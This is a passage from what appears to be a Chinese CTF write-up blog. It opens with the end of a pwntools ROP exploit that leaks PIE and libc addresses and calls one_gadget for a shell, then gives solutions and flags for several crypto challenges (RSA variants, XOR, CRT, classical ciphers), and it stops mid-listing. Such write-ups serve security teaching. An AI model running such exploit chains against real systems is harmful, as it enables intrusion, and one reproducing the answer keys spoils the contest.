class="string">&#x27;./ez_fullprotection&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(<span class="string">b&#x27;x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(<span class="string">b&#x27;+&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;entered &#x27;</span>)</span><br><span class="line">_start=<span class="built_in">eval</span>(r.recvuntil(<span class="string">b&#x27;.&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">base=_start - elf.sym._start</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line"></span><br><span class="line">puts_plt=base+elf.plt.puts</span><br><span class="line">puts_got=base+elf.got.puts</span><br><span class="line">pop_rdi=base+<span class="number">0x16e3</span></span><br><span class="line">ret=base+<span class="number">0x101a</span></span><br><span class="line">ret_addr=base+<span class="number">0x1541</span></span><br><span class="line"></span><br><span class="line">pl=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(ret_addr)</span><br><span class="line">pl=pl.ljust(<span class="number">0x870</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">r.sendline(pl)</span><br><span class="line"></span><br><span class="line">puts_addr=u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_base=puts_addr-libc.sym.puts</span><br><span class="line">ogg=[<span class="number">0xe3afe</span>, <span class="number">0xe3b01</span>, <span class="number">0xe3b04</span>]</span><br><span class="line">ogg=[libc_base+k <span class="keyword">for</span> k <span class="keyword">in</span> ogg]</span><br><span class="line"></span><br><span class="line">pop_4=base+<span class="number">0x16dc</span></span><br><span class="line">pl=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>+<span class="number">8</span>)+p64(pop_4)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(ogg[<span class="number">0</span>])</span><br><span class="line">r.sendline(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="SignIn"><a href="#SignIn" class="headerlink" title="SignIn"></a>SignIn</h3><blockquote><p>Bibo…Hello! 你好! こんにちは! Привет! 5359437b48656c6c6f5f576f726c645f43727970746f5f6269626f6269626f7d… Hmm… Something goes wrong with my grettings bot.</p></blockquote><p>16进制转字符串：<code>SYC&#123;Hello_World_Crypto_bibobibo&#125;</code>。</p><p>​    </p><h3 id="proof-of-work"><a href="#proof-of-work" class="headerlink" title="proof_of_work"></a>proof_of_work</h3><blockquote><p>题目链接：nc 59.110.20.54:5526 Build your own function to solve proof_of_work!</p></blockquote><p>PoW代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;59.110.20.54&#x27;</span>,<span class="number">5526</span>)</span><br><span class="line"></span><br><span class="line">table = string.ascii_letters+string.digits</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PoW</span>():</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;XXXX+&#x27;</span>)</span><br><span class="line">    suffix = r.recv(<span class="number">16</span>).decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;== &#x27;</span>)</span><br><span class="line">    cipher = r.recvline().strip().decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: sha256((x + suffix).encode()).hexdigest() ==</span><br><span class="line">                        cipher, table, length=<span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;XXXX: &#x27;</span>, proof)</span><br><span class="line">    </span><br><span class="line">PoW()</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Congrats! Your flag is: SYC&#123;st3p_1nt0_1nter4ctive_Crypt0graphy&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="SimpleRSA"><a href="#SimpleRSA" class="headerlink" title="SimpleRSA"></a>SimpleRSA</h3><blockquote><p>So simple RSA! Wait… Are you kidding me? <a href="https://en.wikipedia.org/wiki/RSA_(cryptosystem">https://en.wikipedia.org/wiki/RSA_(cryptosystem</a>) hint: flag&lt;p</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> * </span><br><span class="line">flag = <span class="string">b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) == <span class="number">35</span></span><br><span class="line">p,q = [getPrime(<span class="number">2048</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;__&quot;</span>] </span><br><span class="line">n = p*q </span><br><span class="line">e = <span class="number">65537</span> </span><br><span class="line">c = gmpy2.powmod(bytes_to_long(flag),e,n) </span><br><span class="line"><span class="built_in">print</span>(p) </span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="comment">#24724324630507415330944861660078769085865178656494256140070836181271808964994457686409910764936630391300708451701526900994412268365698217113884698394658886249353179639767806926527103624836198494439742123128823109527320850165486500517304731554371680236789357527395416607541627295126502440202040826686102479225702795427693781581584928770373613126894936500089282093366117940069743670997994742595407158340397268147325612840109162997306902492023078425623839297511182053658542877738887677835528624045235391227122453939459585542485427063193993069301141720316104612551340923656979591045138487394366671477460626997125944456537</span></span><br><span class="line"><span class="comment">#510345661718450375632304764819724223824018609359964259503762283253350010161515190912152623604019093266967095847334388281390406831587663253164256543905694021952211220652820225527413861208452760215767828927039893435528572148282529198773772864255061213208279999011194952146362748485103032149806538140693537361755210176698895104708379400806511907719904867068865970241208806615061055047254026118016836750283966478103987375361826198930529462261013324904522014804502582865716441828895047550041401172127129749969507853355531197814919603963664646220505672302543085959372679395717892060245461464861507164276442140407308832537707450729432224150754603518526288767105682399190438680085925078051459448618725871249563011864525585870188123725554411655044152994826056900502298772802133526591794328224932405680583757307064395792317383571866619582974377344736930271554160701478385763426091091686496788999588340419226785217028504684542197970387916262126278955278523452903043316452825738030645100271595942652498852506660789605846309602343932245435421425673058238785509280366229754404949219663043627431437755087855502139890639468481922788973821783957766433857773771229298328019250652625289700950165414584983487319078090573179470893450632419467111117341472</span></span><br></pre></td></tr></table></figure></blockquote><p>$d = e^{-1} \bmod p,\;\;\; m = c^d \bmod p$。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = <span class="number">24724324630507415330944861660078769085865178656494256140070836181271808964994457686409910764936630391300708451701526900994412268365698217113884698394658886249353179639767806926527103624836198494439742123128823109527320850165486500517304731554371680236789357527395416607541627295126502440202040826686102479225702795427693781581584928770373613126894936500089282093366117940069743670997994742595407158340397268147325612840109162997306902492023078425623839297511182053658542877738887677835528624045235391227122453939459585542485427063193993069301141720316104612551340923656979591045138487394366671477460626997125944456537</span></span><br><span class="line">c = <span class="number">510345661718450375632304764819724223824018609359964259503762283253350010161515190912152623604019093266967095847334388281390406831587663253164256543905694021952211220652820225527413861208452760215767828927039893435528572148282529198773772864255061213208279999011194952146362748485103032149806538140693537361755210176698895104708379400806511907719904867068865970241208806615061055047254026118016836750283966478103987375361826198930529462261013324904522014804502582865716441828895047550041401172127129749969507853355531197814919603963664646220505672302543085959372679395717892060245461464861507164276442140407308832537707450729432224150754603518526288767105682399190438680085925078051459448618725871249563011864525585870188123725554411655044152994826056900502298772802133526591794328224932405680583757307064395792317383571866619582974377344736930271554160701478385763426091091686496788999588340419226785217028504684542197970387916262126278955278523452903043316452825738030645100271595942652498852506660789605846309602343932245435421425673058238785509280366229754404949219663043627431437755087855502139890639468481922788973821783957766433857773771229298328019250652625289700950165414584983487319078090573179470893450632419467111117341472</span></span><br><span class="line">d = inverse_mod(e,p-<span class="number">1</span>)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="string">b&#x27;SYC&#123;Just_a_s1mple_modular_equation&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="OTPTwice"><a href="#OTPTwice" class="headerlink" title="OTPTwice"></a>OTPTwice</h3><blockquote><p>I invented a new symmetric cryptosystem, and I believe you will never break it!</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor </span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom </span><br><span class="line">flag = <span class="string">b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># step0: key generation &amp; distribution</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s0</span>(<span class="params">msg</span>): </span><br><span class="line">    k1,k2 = [urandom(<span class="built_in">len</span>(msg)) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;__&quot;</span>] </span><br><span class="line">    <span class="keyword">return</span> k1,k2 </span><br><span class="line"></span><br><span class="line"><span class="comment">#  </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># step1: Alice encrypt M, and send it to Bob</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s1</span>(<span class="params">msg,k1</span>):</span><br><span class="line">    c1 = xor(msg,k1)</span><br><span class="line">    <span class="keyword">return</span> c1 </span><br><span class="line"></span><br><span class="line"><span class="comment"># step2: Bob encrypt c1, and send it to Alice </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s2</span>(<span class="params">msg,k2</span>):</span><br><span class="line">    c2 = xor(msg,k2) </span><br><span class="line">    <span class="keyword">return</span> c2 </span><br><span class="line"></span><br><span class="line"><span class="comment"># step3: Alice decrypt c2, and send it to Bob.</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s3</span>(<span class="params">msg,k1</span>):</span><br><span class="line">    c3 = xor(msg,k1)</span><br><span class="line">    <span class="keyword">return</span> c3 </span><br><span class="line"></span><br><span class="line"><span class="comment"># step4: Bob decrypt c3, get M.</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s4</span>(<span class="params">msg,k2</span>):</span><br><span class="line">    m_ = xor(msg,k2) </span><br><span class="line">    <span class="keyword">return</span> m_ </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">msg,k1,k2</span>): </span><br><span class="line">    c1 = s1(msg,k1) </span><br><span class="line">    c2 = s2(c1,k2) </span><br><span class="line">    c3 = s3(c2,k1)</span><br><span class="line">    m_ = s4(c3,k2) </span><br><span class="line">    <span class="keyword">assert</span> msg == m_</span><br><span class="line"></span><br><span class="line"><span class="comment"># Here&#x27;s what hacker Eve got:</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_</span>(<span class="params">msg,k1,k2</span>):</span><br><span class="line">    c1 = s1(msg,k1) </span><br><span class="line">    c2 = s2(c1,k2) </span><br><span class="line">    c3 = s3(c2,k1)</span><br><span class="line">    m_ = s4(c3,k2) </span><br><span class="line">    <span class="keyword">if</span> HACK == <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(c1) </span><br><span class="line">        <span class="built_in">print</span>(c2) </span><br><span class="line">        <span class="built_in">print</span>(c3) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">k1,k2 = s0(flag) </span><br><span class="line">encrypt_(flag,k1,k2) </span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b&#x27;\xdbi\xab\x8d\xfb0\xd3\xfe!\xf8Xpy\x80w\x8c\x87\xb9&#x27;</span></span><br><span class="line"><span class="string">b&#x27;o\xb0%\xfb\xdb\x0e\r\x04\xde\xd1\x9a\x08w\xda4\x0f\x0cR&#x27;</span></span><br><span class="line"><span class="string">b&#x27;\xe7\x80\xcd\ria\xb2\xca\x89\x1a\x9d;|#3\xf7\xbb\x96&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>推导有 $m = c_1 \oplus c_2 \oplus c_3$。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line"></span><br><span class="line">c1 = <span class="string">b&#x27;\xdbi\xab\x8d\xfb0\xd3\xfe!\xf8Xpy\x80w\x8c\x87\xb9&#x27;</span></span><br><span class="line">c2 = <span class="string">b&#x27;o\xb0%\xfb\xdb\x0e\r\x04\xde\xd1\x9a\x08w\xda4\x0f\x0cR&#x27;</span></span><br><span class="line">c3 = <span class="string">b&#x27;\xe7\x80\xcd\ria\xb2\xca\x89\x1a\x9d;|#3\xf7\xbb\x96&#x27;</span></span><br><span class="line"></span><br><span class="line">m = strxor(strxor(c1,c2),c3)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;I_l0v3_Crypt0&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="OldAlgorithm"><a href="#OldAlgorithm" class="headerlink" title="OldAlgorithm"></a>OldAlgorithm</h3><blockquote><p>An old algorithm but widely used nowadays.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line">flag = <span class="string">b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">pad = <span class="keyword">lambda</span> msg,padlen: msg+os.urandom(padlen-<span class="built_in">len</span>(msg))</span><br><span class="line"></span><br><span class="line">flag = pad(flag,<span class="number">32</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(flag))</span><br><span class="line">p = [getPrime(<span class="number">16</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)] </span><br><span class="line">c = [bytes_to_long(flag)%i <span class="keyword">for</span> i <span class="keyword">in</span> p] </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p=&#x27;</span>,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c=&#x27;</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p= [58657, 47093, 47963, 41213, 57653, 56923, 41809, 49639, 44417, 38639, 39857, 53609, 55621, 41729, 60497, 44647, 39703, 55117, 44111, 57131, 37747, 63419, 63703, 64007, 46349, 39241, 39313, 44909, 40763, 46727, 34057, 56333]</span></span><br><span class="line"><span class="string">c= [36086, 4005, 3350, 23179, 34246, 5145, 32490, 16348, 13001, 13628, 7742, 46317, 50824, 23718, 32995, 7640, 10590, 46897, 39245, 16633, 31488, 36547, 42136, 52782, 31929, 34747, 29026, 18748, 6634, 9700, 8126, 5197]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>CRT算法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p = [<span class="number">58657</span>, <span class="number">47093</span>, <span class="number">47963</span>, <span class="number">41213</span>, <span class="number">57653</span>, <span class="number">56923</span>, <span class="number">41809</span>, <span class="number">49639</span>, <span class="number">44417</span>, <span class="number">38639</span>, <span class="number">39857</span>, <span class="number">53609</span>, <span class="number">55621</span>, <span class="number">41729</span>, <span class="number">60497</span>, <span class="number">44647</span>, <span class="number">39703</span>, <span class="number">55117</span>, <span class="number">44111</span>, <span class="number">57131</span>, <span class="number">37747</span>, <span class="number">63419</span>, <span class="number">63703</span>, <span class="number">64007</span>, <span class="number">46349</span>, <span class="number">39241</span>, <span class="number">39313</span>, <span class="number">44909</span>, <span class="number">40763</span>, <span class="number">46727</span>, <span class="number">34057</span>, <span class="number">56333</span>]</span><br><span class="line">c = [<span class="number">36086</span>, <span class="number">4005</span>, <span class="number">3350</span>, <span class="number">23179</span>, <span class="number">34246</span>, <span class="number">5145</span>, <span class="number">32490</span>, <span class="number">16348</span>, <span class="number">13001</span>, <span class="number">13628</span>, <span class="number">7742</span>, <span class="number">46317</span>, <span class="number">50824</span>, <span class="number">23718</span>, <span class="number">32995</span>, <span class="number">7640</span>, <span class="number">10590</span>, <span class="number">46897</span>, <span class="number">39245</span>, <span class="number">16633</span>, <span class="number">31488</span>, <span class="number">36547</span>, <span class="number">42136</span>, <span class="number">52782</span>, <span class="number">31929</span>, <span class="number">34747</span>, <span class="number">29026</span>, <span class="number">18748</span>, <span class="number">6634</span>, <span class="number">9700</span>, <span class="number">8126</span>, <span class="number">5197</span>]</span><br><span class="line">m = crt(c,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;CRT_1s_s0_ju1cy!&#125;]mC\x9c\xf9C/\xfc\xb8t\x16&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="easy-classic"><a href="#easy-classic" class="headerlink" title="easy_classic"></a>easy_classic</h3><blockquote><p>非常好套娃，使我的古典旋转</p></blockquote><p>每一层解出的字符串为下一层zip压缩包密码。</p><p>第1层：<code>udzeojxuwqcu</code>，ROT10，得：<code>enjoythegame</code></p><p>第2层：<code>ialhhooavtepcyr</code>，栅栏7，得：<code>ilovecryptohaha</code></p><p>第3层：<code>5a6H5a6Z5LiH5rOV55qE6YKj5Liq5rqQ5aS0</code>，base64，得：<code>宇宙万法的那个源头</code></p><p>第4层：<code>熊曰：呋食食食取噗山笨笨破嗄咯哈動嗡雜類嗒嘿啽沒歡破吖咬我啽寶盜噔咯沒</code>，熊曰解密，得：<code>never gonna give you up</code></p><p>第5层：<code>password: adltlfltqrcy</code>，<code>key: 👝👘👠👩👞👘👤👜</code>，</p><p>先base100，得：key=<code>fairgame</code>，再playfair，得：<code>genshinstart</code></p><p>flag：<code>SYC&#123;classical_1s_fun&#125;</code></p><p>​    </p><h3 id="PolyRSA"><a href="#PolyRSA" class="headerlink" title="PolyRSA"></a>PolyRSA</h3><blockquote><p>Harder RSA. Check it out!</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *  </span><br><span class="line">flag = <span class="string">b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span></span><br><span class="line">p,q = [getPrime(<span class="number">2048</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;__&quot;</span>] </span><br><span class="line">e1,e2 = [getPrime(<span class="number">17</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;__&quot;</span>] </span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = p*q </span><br><span class="line">c1 = gmpy2.powmod(<span class="number">2</span>*p + <span class="number">3</span>*q,e1,n)</span><br><span class="line">c2 = gmpy2.powmod(<span class="number">5</span>*p + <span class="number">7</span>*q,e2,n) </span><br><span class="line">c = gmpy2.powmod(bytes_to_long(flag),e,n) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e1=&quot;</span>,e1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e2=&quot;</span>,e2) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c1=&quot;</span>,c1) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c2=&quot;</span>,c2) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line"></span><br><span class="line"><span class="comment">#e1= 113717</span></span><br><span class="line"><span class="comment">#e2= 80737</span></span><br><span class="line"><span class="comment">#c1= 97528398828294138945371018405777243725957112272614466238005409057342884425132214761228537249844134865481148636534134025535106624840957740753950100180978607132333109806554009969378392835952544552269685553539656827070349532458156758965322477969141073720173165958341043159560928836304172136610929023123638981560836183245954461041167802574206323129671965436040047358250847178930436773249800969192016749684095882580749559014647942135761757750292281205876241566597813517452803933496218995755905344070203047797893640399372627351254542342772576533524820435965479881620338366838326652599102311019884528903481310690767832417584600334987458835108576322111553947045733143836419313427495888019352323209000292825566986863770366023326755116931788018138432898323148059980463407567431417724940484236335082696026821105627826117901730695680967455710434307270501190258033004471156993017301443803372029004817834317756597444195146024630164820841200575179112295902020141040090350486764038633257871003899386340004440642516190842086462237559715130631205046041819931656962904630367121414263911179041905140516402771368603623318492074423223885367923228718341206283572152570049573607906130786276734660847733952210105659707746969830132429975090175091281363770357</span></span><br><span class="line"><span class="comment">#c2= 353128571201645377052005694809874806643786163076931670184196149901625274899734977100920488129375537186771931435883114557320913415191396857882995726660784707377672210953334914418470453787964899846194872721616628198368241044602144880543115393715025896206210152190007408112767478800650578941849344868081146624444817544806046188600685873402369145450593575618922226415069043442295774369567389939040265656574664538667552522329712111984168798829635080641332045614585247317991581514218486004191829362787750803153463482021229058714990823658655863245025037102127138472397462755776598314247771125981017814912049441827643898478473451005083533693951329544115861795587564408860828213753948427321483082041546722974666875065831843384005041800692983406353922680299538080900818930589336142421748023025830846906503542594380663429947801329079870530727382679634952272644949425079242992486832995962516376820051495641486546631849426876810933393153871774796182078367277299340503872124124714036499367887886486264658590613431293656417255355575602576047502506125375605713228912611320198066713358654181533335650785578352716562937038768171269136647529849805172492594142026261051266577821582011917001752590659862613307646536049830151262848916867223615064832279222</span></span><br><span class="line"><span class="comment">#c= 375617816311787295279632219241669262704366237192565344884527300748210925539528834207344757670998995567820735715933908541800125317082581328287816628816752542104514363629022246620070560324071543077301256917337165566677142545053272381990573611757629429857842709092285442319141751484248315990593292618113678910350875156232952525787082482638460259354559904243062546518553607882194808191571131590524874275187750985821420412987586148770397073003186510357920710387377990379862185266175190503647626248057084923516190642292152259727446111686043531725993433395002330208067534104745851308178560234372373476331387737629284961288204368572750848248186692623500372605736825205759172773503283282321274793846281079650686871355211691681512637459986684769598186821524093789286661348936784712071312135814683041839882338235290487868969391040389837253093468883093296547473466050960563347060307256735803099039921213839491129726807647623542881247210251994139130146519265086673883077644185971830004165931626986486648581644383717994174627681147696341976767364316172091139507445131410662391699728189797082878876950386933926807186382619331901457205957462337191923354433435013338037399565519987793880572723211669459895193009710035003369626116024630678400746946356</span></span><br><span class="line"><span class="comment">#n= 728002565949733279371529990942440022467681592757835980552797682116929657292509059813629423038094227544032071413317330087468458736175902373398210691802243764786251764982802000867437756347830992118278032311046807282193498960587170291978547754942295932606784354258945168927044376692224049202979158068158842475322825884209352566494900083765571037783472505580851500043517614314755340168507097558967372661966013776090657685241689631615245294004694287660685274079979318342939473469143729494106686592347327776078649315612768988028622890242005700892937828732613800620455225438339852445425046832904615827786856105112781009995862999853122308496903885748394541643702103368974605177097553007573113536089894913967154637055293769061726082740854619536748297829779639633209710676774371525146758917646731487495135734759201537358734170552231657257498090553682791418003138924472103077035355223367678622115314235119493397080290540006942708439607767313672671274857069053688258983103863067394473084183472609906612056828326916114024662795812611685559034285371151973580240723680736227737324052391721149957542711415812665358477474058103338801398214688403784213100455466705770532894531602252798634923125974783427678469124261634518543957766622712661056594132089</span></span><br></pre></td></tr></table></figure></blockquote><p>参考GKCTF 2021 - RRRRsa相关推导，消元求gcd得 $p$。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">e1= <span class="number">113717</span></span><br><span class="line">e2= <span class="number">80737</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c1= <span class="number">97528398828294138945371018405777243725957112272614466238005409057342884425132214761228537249844134865481148636534134025535106624840957740753950100180978607132333109806554009969378392835952544552269685553539656827070349532458156758965322477969141073720173165958341043159560928836304172136610929023123638981560836183245954461041167802574206323129671965436040047358250847178930436773249800969192016749684095882580749559014647942135761757750292281205876241566597813517452803933496218995755905344070203047797893640399372627351254542342772576533524820435965479881620338366838326652599102311019884528903481310690767832417584600334987458835108576322111553947045733143836419313427495888019352323209000292825566986863770366023326755116931788018138432898323148059980463407567431417724940484236335082696026821105627826117901730695680967455710434307270501190258033004471156993017301443803372029004817834317756597444195146024630164820841200575179112295902020141040090350486764038633257871003899386340004440642516190842086462237559715130631205046041819931656962904630367121414263911179041905140516402771368603623318492074423223885367923228718341206283572152570049573607906130786276734660847733952210105659707746969830132429975090175091281363770357</span></span><br><span class="line">c2= 